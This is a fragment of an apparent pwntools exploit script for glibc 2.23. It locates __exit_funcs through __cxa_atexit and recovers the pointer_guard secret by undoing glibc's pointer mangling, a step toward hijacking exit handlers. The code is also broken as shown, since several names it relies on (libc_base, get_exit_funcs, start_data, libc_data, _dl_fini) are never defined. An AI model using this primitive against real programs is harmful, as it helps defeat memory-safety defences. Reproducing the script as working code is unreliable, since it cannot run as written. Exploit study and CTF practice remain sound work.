#!/bin/python3
# Rotate left: 0b1001 --> 0b0011
from pwn import * 
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
libc_filename = './libc-2.23.so'
elf = ELF (libc_filename)

# get libc data
content = ''
with open (libc_filename) as fp:
    content = fp.read ()

# get our exit_funcs address
off_cxa_atexit = elf.symbols['__cxa_atexit']
ptr_exit_funcs = libc_base + get_exit_funcs (content, off_cxa_atexit)
off_exit_funcs = ptr_exit_funcs - start_data
__exit_funcs = struct.unpack ('<Q', libc_data[off_exit_funcs:off_exit_funcs + 8])[0]
# our encoded pointer location
off_ptr_encoded = (__exit_funcs - start_data) + 24
ptr_encoded = struct.unpack ('<Q', libc_data[off_ptr_encoded:off_ptr_encoded + 8])[0]
# this is used to encode pointers
ptr_guard = ror (ptr_encoded, 0x11, 64) ^ _dl_fini

# print '\n[+] Leak __exit_funcs'
# print 'start_data               : 0x%016x' % start_data
# print 'ptr_exit_funcs           : 0x%016x' % ptr_exit_funcs
# print 'exit_funcs               : 0x%016x' % __exit_funcs
# print 'off_ptr_encoded          : 0x%016x' % off_ptr_encoded
# print 'ptr_encoded              : 0x%016x' % ptr_encoded
# print 'ptr_guard                : 0x%016x' % ptr_guard
#

           

          

